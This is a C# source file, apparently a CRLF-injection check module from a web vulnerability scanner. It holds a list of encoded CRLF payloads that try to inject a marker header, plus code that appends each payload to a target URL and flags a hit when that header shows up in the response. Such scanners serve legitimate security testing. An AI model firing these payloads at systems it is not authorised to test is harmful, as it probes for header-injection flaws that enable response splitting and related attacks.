using Clark.Attack.Common.Interfaces;
using Clark.Attack.Common.Models;
using Clark.Common.Models;
using Clark.Common.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Clark.Attack.CRLF
{
    public class Processor : IAttack
    {


        public string Name = "CLRF";

        #region Private
        private static List<string> _payloads = new List<string>()
        {
            "%0d%0a%09headername:%20headervalue",
            "%0aheadername:%20headervalue",
            "%3f%0dheadername:%20headervalue",
            "%0d%0aheadername:%20headervalue",
            "%0dheadername:%20headervalue",
            "%23%0dheadername:%20headervalue",
            "%3f%0d%0aheadername:%20headervalue",
            "%E5%98%8A%E5%98%8Dheadername:%20headervalue",
            "?t=+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++headername:%20headervalue",
            "%0Aheadername:headervalue",
            "%0A%20headername:headervalue",
            "%20%0Aheadername:headervalue",
            "%23%OAheadername:headervalue",
            "%E5%98%8A%E5%98%8Dheadername:headervalue",
            "%E5%98%8A%E5%98%8D%0Aheadername:headervalue",
            "%3F%0Aheadername:headervalue",
            "crlf%0Aheadername:headervalue",
            "crlf%0A%20headername:headervalue",
            "crlf%20%0Aheadername:headervalue",
            "crlf%23%OAheadername:headervalue",
            "crlf%E5%98%8A%E5%98%8Dheadername:headervalue",
            "crlf%E5%98%8A%E5%98%8D%0Aheadername:headervalue",
            "crlf%3F%0Aheadername:headervalue",
            "%0Dheadername:headervalue",
            "%0D%20headername:headervalue",
            "%20%0Dheadername:headervalue",
            "%23%0Dheadername:headervalue",
            "%23%0Aheadername:headervalue",
            "%E5%98%8A%E5%98%8Dheadername:headervalue",
            "%E5%98%8A%E5%98%8D%0Dheadername:headervalue",
            "%3F%0Dheadername:headervalue",
            "crlf%0Dheadername:headervalue",
            "crlf%0D%20headername:headervalue",
            "crlf%20%0Dheadername:headervalue",
            "crlf%23%0Dheadername:headervalue",
            "crlf%23%0Aheadername:headervalue",
            "crlf%E5%98%8A%E5%98%8Dheadername:headervalue",
            "crlf%E5%98%8A%E5%98%8D%0Dheadername:headervalue",
            "crlf%3F%0Dheadername:headervalue",
            "%0D%0Aheadername:headervalue",
            "%0D%0A%20headername:headervalue",
            "%20%0D%0Aheadername:headervalue",
            "%23%0D%0Aheadername:headervalue",
            "\r\nheadername:headervalue",
            "%5cr%5cnheadername:headervalue",
            "%E5%98%8A%E5%98%8Dheadername:headervalue",
            "%E5%98%8A%E5%98%8D%0D%0Aheadername:headervalue",
            "%3F%0D%0Aheadername:headervalue",
            "crlf%0D%0Aheadername:headervalue",
            "crlf%0D%0A%20headername:headervalue",
            "crlf%20%0D%0Aheadername:headervalue",
            "crlf%23%0D%0Aheadername:headervalue",
            "crlf\r\nheadername:headervalue",
            "crlf%5cr%5cnheadername:headervalue",
            "crlf%E5%98%8A%E5%98%8Dheadername:headervalue",
            "crlf%E5%98%8A%E5%98%8D%0D%0Aheadername:headervalue",
            "crlf%3F%0D%0Aheadername:headervalue",
            "%0D%0A%09headername:headervalue",
            "crlf%0D%0A%09headername:headervalue",
            "%250Aheadername:headervalue",
            "%25250Aheadername:headervalue",
            "%%0A0Aheadername:headervalue",
            "%25%30Aheadername:headervalue",
            "%25%30%61headername:headervalue",
            "%u000Aheadername:headervalue",
            "//www.google.com/%2F%2E%2E%0D%0Aheadername:headervalue",
            "/www.google.com/%2E%2E%2F%0D%0Aheadername:headervalue",
            "/google.com/%2F..%0D%0Aheadername:headervalue",
        };

        #endregion

        public AttackResult Check(AttackRequest request)
        {
            var result = new AttackResult();

            foreach (string payload in _payloads)
            {
                //Todo: multithread this one
                CheckCRLF(request.URL, payload, result);
            }

            return result;
        }

        private void CheckCRLF(string url, string payload, AttackResult result)
        {
            string testUrl = url.Trim('/') + "/" + payload;
            WebPageRequest webRequest = new WebPageRequest(testUrl);
            WebPageLoader.Load(webRequest);
            if (webRequest.Response.Headers.AllKeys.Contains("headername"))
            {
                result.Success = true;
                result.Results.Add(testUrl);
            }
        }
    }
}